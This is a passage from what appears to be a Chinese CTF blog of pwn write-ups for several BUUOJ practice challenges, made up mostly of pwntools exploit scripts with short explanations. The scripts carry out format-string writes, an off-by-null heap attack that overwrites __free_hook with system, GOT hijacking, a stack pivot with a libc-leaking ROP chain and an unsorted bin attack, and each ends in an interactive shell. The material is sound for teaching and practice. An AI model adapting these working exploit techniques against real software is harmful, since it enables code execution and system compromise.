class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%9$hhn&quot;</span>.<span class="built_in">format</span>((stack_ret_addr &amp; <span class="number">0xff</span>) + <span class="number">2</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%35$hhn&quot;</span>.<span class="built_in">format</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;6&quot;</span> * <span class="number">8</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#9  35</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./npuctf_2020_level2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27290</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload1=<span class="string">&#x27;%7$p#%9$p@&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=(<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;#&quot;</span>,<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">231</span>)-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">addr_stack=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;@&quot;</span>,<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">one_gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget=one_gadgets[<span class="number">1</span>]+libc_base</span><br><span class="line">stackbase = addr_stack &amp; <span class="number">0xffff</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stackbase) + <span class="string">&#x27;c%9$hn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stackbase+<span class="number">1</span>)+<span class="string">&#x27;c%9$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stackbase+<span class="number">2</span>)+<span class="string">&#x27;c%9$hhn\x00&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\x20\x20\xb4&#x27;</span>, <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%35$hhn\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recv(&#x27;\x20\x20\xb4&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;66666666\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="asis2016_b00ksoff-by-null"><a class="markdownIt-Anchor" href="#asis2016_b00ksoff-by-null">#</a> asis2016_b00ks(off-by-null)</h1><h2 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28085</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./asis2016_b00ks&quot;)</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    gdb.attach(r, </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    b *$rebase(0x1245)</span></span><br><span class="line"><span class="string">    x/20gx $rebase(0x202040)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">one_gadget_16 = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt; &quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1, content1, size2, content2</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book name size: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>)</span><br><span class="line">    r.send(content1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book description size: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size2))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter book description: &quot;</span>)</span><br><span class="line">    r.send(content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter new book description: &quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params">name</span>):</span><br><span class="line">    r.recvuntil(menu)</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">&#x27;aa\n&#x27;</span>, <span class="number">0x90</span>, <span class="string">&#x27;aa\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x21000</span>, <span class="string">&#x27;aa\n&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;aa\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x160</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(heap+<span class="number">0x198</span>)*<span class="number">2</span> + p64(<span class="number">0xffff</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">edit_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line"><span class="comment">#offset = 0x7fc715ef1010 - 0x7fc71593e000</span></span><br><span class="line">offset = <span class="number">0x7f4875e6a010</span> - <span class="number">0x7f48758a4000</span></span><br><span class="line">libc.address = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(bin_sh) + p64(free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(system)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="babyfengshui_33c3_2016"><a class="markdownIt-Anchor" href="#babyfengshui_33c3_2016">#</a> babyfengshui_33c3_2016</h1><h2 id="程序分析-2"><a class="markdownIt-Anchor" href="#程序分析-2">#</a> 程序分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202072305811.png" alt="image-20220207230521669"></p><p>checksec 后可以看到 relro 保护没开，可以劫持函数 got 表</p><p>由于是 <code>*（&amp;ptr+a1）-4</code>  是靠偏移来确定大小的，所以也就只有在 name 堆块与 text 堆块在物理地址相邻时才有作用，因此我们可以通过 delete 函数删除一个 user 便可以使程序连续 free 掉两个堆块，从而使两个 0x88 的堆块合并成为一个 <code>0x110</code>  的堆块</p><p>进而我们再次使用 add 添加数据的时候，第一次输入的 name 设置大小为 0x100 就可以使 name 与 text 堆块物理不相邻，这样一来我们的 text 字段便可输入任意大小的数据</p><p>接下来就可以对能够造成溢出的 name 堆块填充大量的数据覆盖到下一个 user 的 name 字段中，来控制下一个 user 中的 text 地址指向</p><p>最后便可以控制该 text 指向某个函数的 got 表地址，即可劫持函数的 got 表指向 system 函数。</p><h2 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,26147)</span></span><br><span class="line">p=process(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,length,text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size of description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text length:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text:&quot;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,length,text</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam1&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam2&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam3&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment">#写入/bin/sh</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;nam1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p32(free_got)</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x80</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="gyctf_2020_borrowstack栈迁移"><a class="markdownIt-Anchor" href="#gyctf_2020_borrowstack栈迁移">#</a> gyctf_2020_borrowstack (栈迁移)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29385</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">payload=p64(ret)*<span class="number">20</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="hitcontraining_magicheapunsorted-bin-attack"><a class="markdownIt-Anchor" href="#hitcontraining_magicheapunsorted-bin-attack">#</a> hitcontraining_magicheap（unsorted bin attack)</h1><blockquote><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。<br>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。<br>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。<br>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202072330538.png" alt="在这里插入图片描述"></p><p>初始状态时 unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。<br>执行 free 由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。<br>修改 p [1] 经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。<br>所以核心在于通过修改使堆块的 fd 指针指向利用的地址 - 16</p></blockquote><h2 id="exp-8"><a class="markdownIt-Anchor" href="#exp-8">#</a> EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./magicheap&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26349</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateHeap</span>(<span class="params">size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EditHeap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span 